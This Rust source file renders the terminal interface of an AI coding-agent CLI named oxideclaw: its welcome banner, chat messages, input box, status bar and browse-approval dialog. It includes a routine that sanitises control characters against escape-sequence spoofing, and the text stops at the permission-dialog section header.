/// Render — matches oxideclaw's visual style exactly.
///
/// Welcome screen:
///   ─ oxideclaw v0.1.0 ──────────────────────────────────────────
///   │  Welcome back, yetipaw!   │  Tips for getting started         │
///   │  [logo]                   │  ──────────────────────────────   │
///   │  ● sonnet-4-6 · label     │  Recent activity                  │
///   │  ~/cwd                    │  ◆ session entries…               │
///   ─────────────────────────────────────────────────────────────────
///   > _
/// > ? for shortcuts                ⠋ Thinking…  [Esc]       ● sonnet-4-6
///
/// Chat mode (banner gone, just messages):
///   > user message
/// > ● assistant response
///   > _
use crate::tui::app::{App, EntryKind};
use crate::tui::markdown;
use ratatui::{
    Frame,
    layout::{Constraint, Direction, Layout, Rect},
    style::{Color, Modifier, Style},
    text::{Line, Span, Text},
    widgets::{Block, Borders, Clear, Paragraph, Wrap},
};

// Orange/amber — oxideclaw accent (dark theme default)
const ACCENT: Color = Color::Rgb(255, 165, 0);
const USER_BG: Color = Color::Rgb(30, 30, 35);

const VERSION: &str = env!("CARGO_PKG_VERSION");

// Logo: pixel-R + small fork ──► claw scratch marks.
// Claw = 3 cascading ╲╲╲ rows (each shifted right) — looks like a claw strike,
// NOT a fork (no tines, no converging, no handle — parallel diagonal slashes).
const LOGO: &[&str] = &[
    "████  ╷╷╷  ╲╲╲  ", // R top  + fork tines + claw strike row 1
    "█   █ └┼┘   ╲╲╲ ", // R bowl + fork neck  + claw strike row 2 (shifted →)
    "████   │ ──► ╲╲╲", // R mid  + fork + ──► + claw strike row 3 (rightmost)
    "█  █            ", // R left + right legs
    "█   █           ", // R legs spread
    "                ", // base
];
const LOGO_COLOR: Color = Color::Rgb(240, 120, 60);

// ── Theme-aware color helpers ─────────────────────────────────────────────────

/// ThemeColors is Copy so it can be computed once in draw() and passed by value
/// to all sub-functions — avoids 8+ redundant theme_colors() calls per frame.
#[derive(Copy, Clone)]
struct ThemeColors {
    accent: Color,
    user_bg: Color,
    logo: Color,
    assistant: Color, // assistant bullet color
    tool: Color,      // tool call/result color
}

fn theme_colors(theme: &str) -> ThemeColors {
    match theme {
        "light" => ThemeColors {
            accent: Color::Rgb(180, 100, 0),    // darker orange for light bg
            user_bg: Color::Rgb(240, 240, 245), // near-white tint
            logo: Color::Rgb(200, 90, 40),
            assistant: Color::Rgb(0, 120, 0), // darker green
            tool: Color::Rgb(140, 100, 0),    // darker amber
        },
        "solarized" => ThemeColors {
            accent: Color::Rgb(203, 75, 22), // solarized orange
            user_bg: Color::Rgb(0, 43, 54),  // solarized base03
            logo: Color::Rgb(203, 75, 22),
            assistant: Color::Rgb(133, 153, 0), // solarized green
            tool: Color::Rgb(181, 137, 0),      // solarized yellow
        },
        _ => ThemeColors {
            // dark (default)
            accent: ACCENT,
            user_bg: USER_BG,
            logo: LOGO_COLOR,
            assistant: Color::Green,
            tool: Color::Yellow,
        },
    }
}

pub fn draw(f: &mut Frame, app: &mut App) {
    let area = f.area();

    // Compute theme once — passed by value (Copy) to all sub-functions,
    // avoiding 8+ separate theme_colors() calls per frame.
    let tc = theme_colors(&app.theme);

    // Welcome screen — shown when no chat entries exist yet.
    // Automatically hides when any content is pushed (commands, messages, etc.)
    // and reappears after /clear (which empties entries).
    let show_banner = app.show_welcome && app.entries.is_empty() && app.streaming.is_empty();

    let full_input: String = app.input.iter().collect();
    let (input, input_height) = input_view(app, &full_input, tc, area.width);

    // Banner height — must match viewport_height() in run.rs exactly.
    // border top+bottom = 2; left col = logo + 4 header/model/cwd lines;
    // right col = 6 fixed lines + 2 per session (max 4 sessions shown).
    let banner_h = if show_banner {
        let logo_h = LOGO.len() as u16;
        let left_h = logo_h + 7; // welcome + blank + logo + blank + model + cwd + blank + tagline
        let sess_h = (app.recent_sessions.len() as u16).min(4) * 2;
        let right_h = 6 + sess_h;
        left_h.max(right_h) + 2
    } else {
        0
    };

    let outer = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Length(banner_h),     // welcome banner (welcome screen only)
            Constraint::Min(0),               // chat messages
            Constraint::Length(input_height), // input line (no border)
            Constraint::Length(1),            // status bar
        ])
        .split(area);

    if show_banner {
        draw_banner(f, outer[0], app, tc);
    }
    draw_chat(f, outer[1], app, tc);
    f.render_widget(input, outer[2]);
    draw_status(f, outer[3], app, tc);

    // Same precedence as handle_key, so the dialog on screen is always the
    // one a keypress answers ('a' on a hidden permission prompt is Always).
    if app.overlay.is_some() {
        draw_overlay(f, area, app, tc);
    } else if app.pending_permission.is_some() {
        draw_permission(f, area, app, tc);
    } else if app.browse_approval.is_some() {
        draw_browse_approval(f, area, app, tc);
    } else if app.pending_user_question.is_some() {
        draw_ask_user(f, area, app);
    }

    // Must stay last so nothing drawn above can bypass it.
    sanitize_buffer(f.buffer_mut());
}

/// Replace control characters in rendered cells with visible stand-ins.
/// Paragraph writes every width-1 grapheme verbatim and unicode-width counts
/// ESC/BEL/TAB as width 1, so tool output, file contents or a model-written
/// command could otherwise emit raw escape sequences: redraw the permission
/// dialog over the real command or set the clipboard via OSC 52. A control
/// char is always its own grapheme, so a width-1 placeholder shifts nothing.
pub(crate) fn sanitize_buffer(buf: &mut ratatui::buffer::Buffer) {
    for cell in buf.content.iter_mut() {
        if !cell.symbol().chars().any(char::is_control) {
            continue;
        }
        let clean: String = cell
            .symbol()
            .chars()
            .map(|c| match c {
                '\t' | '\r' => ' ',
                '\u{7f}' => '\u{2421}',
                c if (c as u32) < 0x20 => char::from_u32(0x2400 + c as u32).unwrap_or('\u{fffd}'),
                c if c.is_control() => '\u{fffd}',
                c => c,
            })
            .collect();
        cell.set_symbol(&clean);
    }
}

// ── Welcome banner — 2-column bordered box matching the TS oxideclaw fork ──────

fn draw_banner(f: &mut Frame, area: Rect, app: &App, tc: ThemeColors) {
    let block = Block::default()
        .borders(Borders::ALL)
        .border_style(Style::default().fg(tc.accent))
        .title(Span::styled(
            format!(" oxideclaw v{VERSION} "),
            Style::default().fg(tc.accent).add_modifier(Modifier::BOLD),
        ));

    let inner = block.inner(area);
    f.render_widget(block, area);

    // Left column: 42% of width but never less than 22 cols (logo is 19 wide,
    // keeps a tiny margin) and never more than width-15 so the right panel
    // always has something to render.
    let left_w = ((inner.width as u32 * 42 / 100) as u16)
        .max(22)
        .min(inner.width.saturating_sub(15));
    let halves = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Length(left_w), Constraint::Fill(1)])
        .split(inner);

    draw_banner_left(f, halves[0], app, tc);
    draw_banner_right(f, halves[1], app, tc);
}

fn draw_banner_left(f: &mut Frame, area: Rect, app: &App, tc: ThemeColors) {
    let max_cwd = area.width.saturating_sub(3) as usize;
    let cwd_chars = app.cached_cwd.chars().count();
    let cwd_display = if cwd_chars > max_cwd {
        // chars, not bytes: a byte cut can land inside `ó` and panic.
        let tail: String = app
            .cached_cwd
            .chars()
            .skip(cwd_chars - max_cwd.saturating_sub(1))
            .collect();
        format!("…{tail}")
    } else {
        app.cached_cwd.clone()
    };

    let mut lines: Vec<Line<'static>> = Vec::new();

    lines.push(Line::from(Span::styled(
        format!("  Welcome back, {}!", app.username),
        Style::default()
            .fg(Color::White)
            .add_modifier(Modifier::BOLD),
    )));
    lines.push(Line::raw(""));

    for logo_line in LOGO {
        lines.push(Line::from(vec![
            Span::raw("  "),
            Span::styled(logo_line.to_string(), Style::default().fg(tc.logo)),
        ]));
    }

    lines.push(Line::raw("")); // breathing room between fork and model info

    // "  ● " prefix = 4 cols; remaining space for model+label text.
    let max_model = area.width.saturating_sub(4) as usize;
    // Build: "Sonnet 4.6 with high effort · Label" (effort + label both optional)
    let mut model_text = app.model_short.clone();
    if let Some(eff) = &app.effort {
        model_text.push_str(&format!(" with {eff} effort"));
    }
    if let Some(label) = &app.banner_label {
        model_text.push_str(&format!(" · {label}"));
    }
    let model_text: String = if model_text.chars().count() > max_model {
        let t: String = model_text
            .chars()
            .take(max_model.saturating_sub(1))
            .collect();
        format!("{t}…")
    } else {
        model_text
    };
    lines.push(Line::from(vec![
        Span::raw("  "),
        Span::styled("● ", Style::default().fg(tc.assistant)),
        Span::styled(model_text, Style::default().fg(Color::DarkGray)),
    ]));
    lines.push(Line::from(Span::styled(
        format!("  {cwd_display}"),
        Style::default().fg(Color::DarkGray),
    )));
    lines.push(Line::raw("")); // space before tagline
    lines.push(Line::from(Span::styled(
        "  Grip your codebase.",
        Style::default()
            .fg(Color::Gray)
            .add_modifier(Modifier::ITALIC),
    )));

    f.render_widget(Paragraph::new(Text::from(lines)), area);
}

fn draw_banner_right(f: &mut Frame, area: Rect, app: &App, tc: ThemeColors) {
    // Vertical divider on the left edge of this panel
    let divider_area = Rect {
        x: area.x,
        y: area.y,
        width: 1,
        height: area.height,
    };
    let div_lines: Vec<Line<'static>> = (0..area.height)
        .map(|_| Line::from(Span::styled("│", Style::default().fg(tc.accent))))
        .collect();
    f.render_widget(Paragraph::new(Text::from(div_lines)), divider_area);

    let content_area = Rect {
        x: area.x + 1,
        y: area.y,
        width: area.width.saturating_sub(1),
        height: area.height,
    };

    let max_w = content_area.width.saturating_sub(2) as usize;
    let mut lines: Vec<Line<'static>> = vec![
        Line::raw(""),
        Line::from(Span::styled(
            " Tips for getting started",
            Style::default().fg(tc.accent).add_modifier(Modifier::BOLD),
        )),
        Line::from(Span::styled(
            " Run /init to create a CLAUDE.md file with instructions",
            Style::default().fg(Color::White),
        )),
        Line::raw(""),
    ];

    let divider: String = std::iter::repeat_n('─', max_w).collect();
    lines.push(Line::from(Span::styled(
        format!(" {divider}"),
        Style::default().fg(tc.accent),
    )));

    lines.push(Line::from(Span::styled(
        " Recent activity",
        Style::default().fg(tc.accent).add_modifier(Modifier::BOLD),
    )));

    if app.recent_sessions.is_empty() {
        lines.push(Line::from(Span::styled(
            " No recent activity",
            Style::default().fg(Color::DarkGray),
        )));
    } else {
        for (name, id_short, preview) in &app.recent_sessions {
            let desc = if preview.is_empty() {
                "(empty)".to_string()
            } else {
                // Truncate preview to fit: max_w minus the "◆ [id] — " prefix (~16 chars)
                let avail = max_w.saturating_sub(16);
                if preview.len() > avail {
                    let mut end = avail.saturating_sub(1).max(1);
                    while end > 0 && !preview.is_char_boundary(end) {
                        end -= 1;
                    }
                    format!("{}…", &preview[..end])
                } else {
                    preview.clone()
                }
            };
            lines.push(Line::from(vec![
                Span::styled(" ◆ ", Style::default().fg(tc.accent)),
                Span::styled(
                    format!("[{}]", id_short),
                    Style::default().fg(Color::DarkGray),
                ),
                Span::styled(" — ", Style::default().fg(Color::DarkGray)),
                Span::styled(desc, Style::default().fg(Color::White)),
            ]));
            // Show date below in dim
            lines.push(Line::from(Span::styled(
                format!("     {name}"),
                Style::default().fg(Color::DarkGray),
            )));
        }
        lines.push(Line::raw(""));
        lines.push(Line::from(Span::styled(
            " /session  to browse & resume",
            Style::default().fg(Color::DarkGray),
        )));
    }

    f.render_widget(Paragraph::new(Text::from(lines)), content_area);
}

// ── Chat messages ─────────────────────────────────────────────────────────────

fn draw_chat(f: &mut Frame, area: Rect, app: &mut App, tc: ThemeColors) {
    if area.height == 0 {
        return;
    }

    let width = area.width as usize;
    let mut lines: Vec<Line> = Vec::new();

    for entry in &app.entries {
        match entry.kind {
            EntryKind::User => {
                // Full-width dimmed row with dark background — matches oxideclaw
                let first_line = entry.text.lines().next().unwrap_or("");
                let pad = width.saturating_sub(first_line.len() + 4);
                let header = format!(" > {}{}", first_line, " ".repeat(pad));
                lines.push(Line::from(Span::styled(
                    header,
                    Style::default()
                        .fg(Color::White)
                        .bg(tc.user_bg)
                        .add_modifier(Modifier::BOLD),
                )));
                for extra in entry.text.lines().skip(1) {
                    lines.push(Line::from(Span::styled(
                        format!("   {extra}"),
                        Style::default().fg(Color::White).bg(tc.user_bg),
                    )));
                }
                lines.push(Line::raw(""));
            }

            EntryKind::Assistant => {
                let md_lines = markdown::render(&entry.text);
                let mut first = true;
                for md_line in md_lines {
                    if first {
                        let mut spans = vec![Span::styled(
                            "● ",
                            Style::default()
                                .fg(tc.assistant)
                                .add_modifier(Modifier::BOLD),
                        )];
                        spans.extend(md_line.spans);
                        lines.push(Line::from(spans));
                        first = false;
                    } else {
                        let mut spans = vec![Span::raw("  ")];
                        spans.extend(md_line.spans);
                        lines.push(Line::from(spans));
                    }
                }
                lines.push(Line::raw(""));
            }

            EntryKind::ToolCall => {
                let mut parts = entry.text.splitn(2, "  ");
                let tool_name = parts.next().unwrap_or("");
                let args = parts.next().unwrap_or("").trim();
                // Use &str directly — Span accepts impl Into<Cow<str>>, no alloc needed
                lines.push(Line::from(vec![
                    Span::styled("⚙ ", Style::default().fg(tc.tool)),
                    Span::styled(
                        tool_name.to_owned(),
                        Style::default().fg(tc.tool).add_modifier(Modifier::BOLD),
                    ),
                    Span::raw("  "),
                    Span::styled(args.to_owned(), Style::default().fg(Color::DarkGray)),
                ]));
            }

            EntryKind::ToolStream => {
                // Collapsed by default — just show the line count.
                // User can scroll up to see full output in history.
                let total = entry.text.lines().count();
                if total > 0 {
                    lines.push(Line::from(Span::styled(
                        format!("  │ [▸ {} lines]", total),
                        Style::default().fg(Color::DarkGray),
                    )));
                }
            }

            EntryKind::ToolResult => {
                // Show first 2 lines collapsed — enough to see success/failure
                // without flooding the screen with tool output.
                const MAX_LINES: usize = 2;
                let total = entry.text.lines().count();
                let owned_trunc: String;
                let visible_text: &str = if total > MAX_LINES {
                    owned_trunc = entry
                        .text
                        .lines()
                        .take(MAX_LINES)
                        .collect::<Vec<_>>()
                        .join("\n");
                    &owned_trunc
                } else {
                    &entry.text
                };
                let md_lines = markdown::render_dim(visible_text);
                let mut first = true;
                for md_line in md_lines {
                    let prefix = if first { "  └ " } else { "    " };
                    first = false;
                    let mut spans =
                        vec![Span::styled(prefix, Style::default().fg(Color::DarkGray))];
                    spans.extend(md_line.spans);
                    lines.push(Line::from(spans));
                }
                if total > MAX_LINES {
                    lines.push(Line::from(Span::styled(
                        format!("    [▸ {} more lines]", total - MAX_LINES),
                        Style::default().fg(Color::DarkGray),
                    )));
                }
                lines.push(Line::raw(""));
            }

            EntryKind::Thinking => {
                lines.push(Line::from(Span::styled(
                    "  💭 Thinking…",
                    Style::default()
                        .fg(Color::Magenta)
                        .add_modifier(Modifier::BOLD | Modifier::ITALIC),
                )));
                for raw in entry.text.lines() {
                    lines.push(Line::from(Span::styled(
                        format!("  │ {raw}"),
                        Style::default()
                            .fg(Color::DarkGray)
                            .add_modifier(Modifier::ITALIC),
                    )));
                }
                lines.push(Line::raw(""));
            }

            EntryKind::Error | EntryKind::ToolError => {
                // Keep line breaks: a single span drops newlines into one
                // run-on paragraph. Only a failed tool's output (a broken
                // build can be ~1 MB) is collapsed like ToolResult, with a
                // little more room for the error itself; other errors (a
                // missing credential, "Model unchanged: X") are shown whole
                // because there is no key to expand them.
                const MAX_LINES: usize = 6;
                let cap = if matches!(entry.kind, EntryKind::ToolError) {
                    MAX_LINES
                } else {
                    usize::MAX
                };
                let total = entry.text.lines().count();
                for (i, raw) in entry.text.lines().take(cap).enumerate() {
                    let prefix = if i == 0 {
                        Span::styled(
                            "✖ ",
                            Style::default().fg(Color::Red).add_modifier(Modifier::BOLD),
                        )
                    } else {
                        Span::raw("  ")
                    };
                    lines.push(Line::from(vec![
                        prefix,
                        Span::styled(raw.to_owned(), Style::default().fg(Color::Red)),
                    ]));
                }
                if total > cap {
                    lines.push(Line::from(Span::styled(
                        format!("    [▸ {} more lines]", total - cap),
                        Style::default().fg(Color::DarkGray),
                    )));
                }
                lines.push(Line::raw(""));
            }

            EntryKind::System => {
                for raw in entry.text.lines() {
                    // Use Gray (not DarkGray) so system messages are readable
                    // on dark backgrounds — plugin install, MCP registration,
                    // compaction notices, etc. were nearly invisible before.
                    lines.push(Line::from(Span::styled(
                        format!("  {raw}"),
                        Style::default().fg(Color::Gray),
                    )));
                }
                lines.push(Line::raw(""));
            }

            EntryKind::CommandOutput => {
                for raw in entry.text.lines() {
                    let trimmed = raw.trim_start();
                    let indent = &raw[..raw.len() - trimmed.len()];
                    let line = if trimmed.is_empty() {
                        Line::raw("")
                    } else if trimmed.starts_with("✓") {
                        // Success line — green
                        Line::from(Span::styled(
                            raw.to_owned(),
                            Style::default().fg(Color::Green),
                        ))
                    } else if trimmed.starts_with('✗') || trimmed.starts_with("✗") {
                        // Failure line — red
                        Line::from(Span::styled(
                            raw.to_owned(),
                            Style::default().fg(Color::Red),
                        ))
                    } else if trimmed.starts_with("──") || trimmed.starts_with("--") {
                        // Section header — accent color, bold
                        Line::from(Span::styled(
                            raw.to_owned(),
                            Style::default().fg(tc.accent).add_modifier(Modifier::BOLD),
                        ))
                    } else if indent.len() >= 4
                        || trimmed.starts_with("sudo ")
                        || trimmed.starts_with("yay ")
                        || trimmed.starts_with("paru ")
                        || trimmed.starts_with("apt ")
                        || trimmed.starts_with("dnf ")
                        || trimmed.starts_with("zypper ")
                        || trimmed.starts_with("pacman ")
                        || trimmed.starts_with("pip ")
                        || trimmed.starts_with("wget ")
                        || trimmed.starts_with("mkdir ")
                        || trimmed.starts_with("cd ")
                        || trimmed.starts_with("echo ")
                        || trimmed.starts_with("export ")
                    {
                        // Indented install command — amber/yellow so it stands out as actionable
                        Line::from(Span::styled(
                            raw.to_owned(),
                            Style::default().fg(Color::Rgb(200, 160, 60)),
                        ))
                    } else {
                        // Normal info line — readable light gray
                        Line::from(Span::styled(
                            raw.to_owned(),
                            Style::default().fg(Color::Gray),
                        ))
                    };
                    lines.push(line);
                }
                lines.push(Line::raw(""));
            }
        }
    }

    // Live streaming assistant response
    if !app.streaming.is_empty() {
        let md_lines = markdown::render(&app.streaming);
        let mut first = true;
        for md_line in md_lines {
            if first {
                let mut spans = vec![Span::styled(
                    "● ",
                    Style::default()
                        .fg(tc.assistant)
                        .add_modifier(Modifier::BOLD),
                )];
                spans.extend(md_line.spans);
                lines.push(Line::from(spans));
                first = false;
            } else {
                let mut spans = vec![Span::raw("  ")];
                spans.extend(md_line.spans);
                lines.push(Line::from(spans));
            }
        }
        // Blinking cursor indicator
        lines.push(Line::from(vec![
            Span::raw("  "),
            Span::styled("▌", Style::default().fg(tc.assistant)),
        ]));
    }

    // Scroll math — use ratatui's own line_count() so wrap matches exactly
    let para = Paragraph::new(Text::from(lines)).wrap(Wrap { trim: false });
    let total = para.line_count(area.width);
    let visible = area.height as usize;
    let max_scroll = total.saturating_sub(visible);

    if app.follow_bottom {
        app.scroll = max_scroll;
    } else {
        app.scroll = app.scroll.min(max_scroll);
        if app.scroll >= max_scroll {
            app.follow_bottom = true;
        }
    }

    f.render_widget(para.scroll((app.scroll as u16, 0)), area);

    // Scroll indicator badge
    if !app.follow_bottom && total > visible {
        let pct = ((app.scroll as f64 / max_scroll.max(1) as f64) * 100.0) as usize;
        let badge = format!(" ↑ {}% [PgUp/PgDn] ", pct.min(100));
        let bw = badge.len() as u16;
        if area.width > bw + 2 {
            let badge_area = Rect {
                x: area.x + area.width - bw,
                y: area.y,
                width: bw,
                height: 1,
            };
            f.render_widget(
                Paragraph::new(badge).style(Style::default().fg(Color::Black).bg(Color::Yellow)),
                badge_area,
            );
        }
    }
}

// ── Input line (no border — matches oxideclaw's plain "> " prompt) ────────────

/// Rows the input box takes at `width`. viewport_height() sizes the inline
/// viewport with this, so it must be the same measure draw() lays out with.
pub fn input_height(app: &App, width: u16) -> u16 {
    let full_input: String = app.input.iter().collect();
    input_view(app, &full_input, theme_colors(&app.theme), width).1
}

/// The input box at `width` and its height (1..=8 rows), scrolled so the
/// cursor row is inside it.
///
/// The height comes from the paragraph's own wrap: a char-count estimate
/// ignores double-width CJK/emoji, word wrap and the trailing cursor cell,
/// and every row it undercounts (the cursor's row, usually) was clipped.
fn input_view(
    app: &App,
    full_input: &str,
    tc: ThemeColors,
    width: u16,
) -> (Paragraph<'static>, u16) {
    let text_style = Style::default().fg(Color::White);
    let cursor_style = Style::default().bg(Color::White).fg(Color::Black);
    let suggestion_style = Style::default().fg(Color::Rgb(80, 80, 80)); // dim gray
    let prompt_style = if app.vim_enabled && app.vim_normal {
        Style::default().fg(tc.accent).add_modifier(Modifier::BOLD)
    } else {
        Style::default()
            .fg(tc.assistant)
            .add_modifier(Modifier::BOLD)
    };

    let full = full_input;
    let before_cursor = &app.input[..app.cursor];
    let input_lines: Vec<&str> = full.split('\n').collect();
    let cursor_line_idx = before_cursor.iter().filter(|&&c| c == '\n').count();
    // In chars, like `src.chars()` below: a byte count put the cursor past
    // the end of any line with non-ASCII text before it.
    let cursor_col = before_cursor
        .iter()
        .rposition(|&c| c == '\n')
        .map_or(before_cursor.len(), |p| before_cursor.len() - p - 1);

    // Disabled/loading: dim the prompt
    let (prompt_char, effective_prompt_style) = if app.is_loading {
        (">", Style::default().fg(Color::DarkGray))
    } else {
        (">", prompt_style)
    };

    // Compute suggestion once (only on last input line, not when loading)
    let suggestion = if !app.is_loading && cursor_line_idx == input_lines.len() - 1 {
        app.history_suggestion()
    } else {
        None
    };
    // Show placeholder when input is completely empty
    let show_placeholder = full.is_empty() && !app.is_loading;

    // The cursor line cut after the word holding the cursor: wrapping it
    // gives the row the cursor lands on in the full paragraph.
    let mut cursor_prefix: Option<Line<'static>> = None;
    let render_lines: Vec<Line<'static>> = input_lines
        .iter()
        .enumerate()
        .map(|(li, &src)| {
            let prompt = if li == 0 {
                format!("{} ", prompt_char)
            } else {
                "  ".to_string()
            };
            if li == cursor_line_idx && !app.is_loading {
                let chars: Vec<char> = src.chars().collect();
                let col = cursor_col.min(chars.len());
                let before: String = chars[..col].iter().collect();
                // A plain space cursor cell is whitespace to the word wrapper,
                // which drops it where a row breaks: the cursor vanished at the
                // end of a full row. NBSP draws the same but wraps as text.
                let cur_ch: String = match chars.get(col) {
                    Some(' ') | None => "\u{a0}".to_string(),
                    Some(c) => c.to_string(),
                };
                let after: String = if col < chars.len() {
                    chars[col + 1..].iter().collect()
                } else {
                    String::new()
                };
                let word_rest: String = after.chars().take_while(|c| !c.is_whitespace()).collect();
                cursor_prefix = Some(Line::from(vec![
                    Span::raw(prompt.clone()),
                    Span::raw(before.clone()),
                    Span::raw(cur_ch.clone()),
                    Span::raw(word_rest),
                ]));
                // Append dim suggestion or placeholder after cursor (cursor line only)
                let mut spans = vec![
                    Span::styled(prompt, effective_prompt_style),
                    Span::styled(before, text_style),
                    Span::styled(cur_ch, cursor_style),
                    Span::styled(after, text_style),
                ];
                if show_placeholder {
                    spans.push(Span::styled("Message oxideclaw…", suggestion_style));
                } else if let Some(ref sug) = suggestion {
                    spans.push(Span::styled(sug.clone(), suggestion_style));
                }
                Line::from(spans)
            } else {
                Line::from(vec![
                    Span::styled(prompt, effective_prompt_style),
                    Span::styled(src.to_string(), text_style),
                ])
            }
        })
        .collect();

    let wrapped =
        |lines: Vec<Line<'static>>| Paragraph::new(Text::from(lines)).wrap(Wrap { trim: false });
    let rows = |n: usize| u16::try_from(n).unwrap_or(u16::MAX);
    let scroll_to = match cursor_prefix {
        Some(prefix) => {
            let mut upto = render_lines[..cursor_line_idx].to_vec();
            upto.push(prefix);
            rows(wrapped(upto).line_count(width))
        }
        None => 0,
    };
    let para = wrapped(render_lines);
    let height = rows(para.line_count(width)).clamp(1, 8);
    (para.scroll((scroll_to.saturating_sub(height), 0)), height)
}

// ── Status bar ────────────────────────────────────────────────────────────────

fn draw_status(f: &mut Frame, area: Rect, app: &App, tc: ThemeColors) {
    // Use pre-cached model_short — avoids two .replace() allocs every render frame

    // Left side: "? for shortcuts" + optional loading/vim indicator
    let mut left_spans = vec![Span::styled(
        " ? for shortcuts",
        Style::default().fg(Color::DarkGray),
    )];

    if app.vim_enabled {
        let mode = if app.vim_normal { "NORMAL" } else { "INSERT" };
        left_spans.push(Span::styled(
            format!("  │  {mode}"),
            Style::default().fg(tc.accent).add_modifier(Modifier::BOLD),
        ));
    }

    if app.plan_mode {
        left_spans.push(Span::styled(
            "  │  PLAN MODE",
            Style::default()
                .fg(Color::Cyan)
                .add_modifier(Modifier::BOLD),
        ));
    }

    if app.brief_mode {
        left_spans.push(Span::styled(
            "  │  BRIEF",
            Style::default()
                .fg(Color::Blue)
                .add_modifier(Modifier::BOLD),
        ));
    }

    if app.pending_image.is_some() {
        left_spans.push(Span::styled(
            "  │  image attached",
            Style::default().fg(Color::Magenta),
        ));
    }

    if app.voice_recording {
        left_spans.push(Span::styled(
            "  │  REC  Ctrl+R to stop",
            Style::default().fg(Color::Red).add_modifier(Modifier::BOLD),
        ));
    }

    if app.is_loading {
        // Glyph spinner — bounces forward then reverse like a pulsing power-up
        // Custom glyphs: dot → crosshair → starburst → flower (gaming/medical vibe)
        const GLYPHS: [&str; 6] = ["∙", "✦", "✸", "❊", "✺", "❋"];
        // Bounce: forward + reverse = 12 frames total
        const BOUNCE: [usize; 12] = [0, 1, 2, 3, 4, 5, 5, 4, 3, 2, 1, 0];
        let ms = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_millis();
        let frame_idx = (ms / 80) as usize % BOUNCE.len();
        let glyph = GLYPHS[BOUNCE[frame_idx]];
        // Show elapsed time alongside the spinner verb
        let elapsed = app
            .turn_start
            .map(|t| {
                let secs = t.elapsed().as_secs();
                if secs > 0 {
                    format!(" ({}s)", secs)
                } else {
                    String::new()
                }
            })
            .unwrap_or_default();
        left_spans.push(Span::styled(
            format!("  │  {glyph} {}…{elapsed}  [Esc]", app.spinner_verb),
            Style::default().fg(tc.tool),
        ));
    }

    // Router indicator
    if app.router.enabled {
        left_spans.push(Span::styled(
            "  │  ROUTER",
            Style::default()
                .fg(Color::Green)
                .add_modifier(Modifier::BOLD),
        ));
    }

    // Context usage % display
    if app.cost_tracker.last_input_tokens > 0 {
        let pct = app.cost_tracker.context_pct(app.context_window);
        let ctx_color = if pct >= 90.0 {
            Color::Red
        } else if pct >= 70.0 {
            Color::Yellow
        } else {
            Color::DarkGray
        };
        left_spans.push(Span::styled(
            format!("  │  ctx {:.0}%", pct),
            Style::default().fg(ctx_color),
        ));
    }

    // Cost display
    let cost_text = app.cost_tracker.banner_text();
    if !cost_text.is_empty() {
        let cost_color = if app.cost_tracker.over_budget() {
            Color::Red
        } else if app.cost_tracker.budget_warning() {
            Color::Yellow
        } else {
            Color::DarkGray
        };
        left_spans.push(Span::styled(
            format!("  │  {cost_text}"),
            Style::default().fg(cost_color),
        ));
    }

    // Right side: "● model-name" — clean, no token counts (matches oxideclaw)
    // Measured in display columns and clamped to the bar: provider ids like
    // `openrouter:meta-llama/llama-3.1-405b-instruct` are wider than a narrow
    // split pane, and an oversized Rect made Paragraph index outside the
    // buffer, which aborts the process (panic = "abort").
    let right_line = Line::from(Span::styled(
        format!("● {} ", app.model_short),
        Style::default().fg(tc.assistant),
    ));
    let right_width = u16::try_from(right_line.width())
        .unwrap_or(u16::MAX)
        .min(area.width);
    let left_width = area.width - right_width;

    let left_area = Rect {
        x: area.x,
        y: area.y,
        width: left_width,
        height: 1,
    };
    let right_area = Rect {
        x: area.x + left_width,
        y: area.y,
        width: right_width,
        height: 1,
    };

    f.render_widget(Paragraph::new(Line::from(left_spans)), left_area);
    f.render_widget(Paragraph::new(right_line), right_area);
}

// ── Browse approval dialog ────────────────────────────────────────────────────

fn draw_browse_approval(f: &mut Frame, area: Rect, app: &App, tc: ThemeColors) {
    let Some(prompt) = &app.browse_approval else {
        return;
    };

    let lines = vec![
        Line::raw(""),
        Line::from(Span::styled(
            "  ⚠ Browse approval required",
            Style::default()
                .fg(Color::Yellow)
                .add_modifier(Modifier::BOLD),
        )),
        Line::raw(""),
        Line::from(Span::styled(
            format!("  Action:  {}", prompt.tool_name),
            Style::default().fg(Color::White),
        )),
        Line::from(Span::styled(
            format!("  Target:  {}", prompt.target_text),
            Style::default().fg(Color::White),
        )),
        Line::from(Span::styled(
            format!("  URL:     {}", prompt.url),
            Style::default().fg(Color::White),
        )),
        Line::from(Span::styled(
            format!("  Reason:  {}", prompt.reason),
            Style::default().fg(Color::White),
        )),
    ];
    let legend = Line::from(vec![
        Span::styled("  [", Style::default().fg(Color::DarkGray)),
        Span::styled(
            "A",
            Style::default()
                .fg(tc.assistant)
                .add_modifier(Modifier::BOLD),
        ),
        Span::styled("]pprove   [", Style::default().fg(Color::DarkGray)),
        Span::styled(
            "D",
            Style::default().fg(Color::Red).add_modifier(Modifier::BOLD),
        ),
        Span::styled("]eny", Style::default().fg(Color::DarkGray)),
    ]);
    let para = Paragraph::new(Text::from(lines)).wrap(Wrap { trim: true });

    let popup_w = (area.width * 6 / 10).max(50).min(area.width);
    // Sized to the wrapped text: a fixed height let a long target, URL or
    // reason push the later fields and the legend out of view.
    let body_rows =
        u16::try_from(para.line_count(popup_w.saturating_sub(2).max(1))).unwrap_or(u16::MAX);
    // 2 borders + spacer + legend.
    let popup_h = body_rows.saturating_add(4).max(12).min(area.height);
    let x = area.x + (area.width.saturating_sub(popup_w)) / 2;
    let y = area.y + (area.height.saturating_sub(popup_h)) / 2;
    let popup = Rect {
        x,
        y,
        width: popup_w,
        height: popup_h,
    };

    f.render_widget(Clear, popup);

    let block = Block::default()
        .borders(Borders::ALL)
        .border_style(Style::default().fg(Color::Yellow))
        .title(Span::styled(
            " Browse Approval ",
            Style::default()
                .fg(Color::Yellow)
                .add_modifier(Modifier::BOLD),
        ));
    let inner = block.inner(popup);
    f.render_widget(block, popup);

    // Legend pinned to the bottom row, like the permission dialog.
    let legend_h = 1.min(inner.height);
    let body = Rect {
        height: inner.height.saturating_sub(legend_h + 1),
        ..inner
    };
    let legend_area = Rect {
        y: inner.y + inner.height.saturating_sub(legend_h),
        height: legend_h,
        ..inner
    };
    f.render_widget(para, body);
    f.render_widget(Paragraph::new(legend), legend_area);
}

// ── Permission dialog ─────────────────────────────────────────────────────────

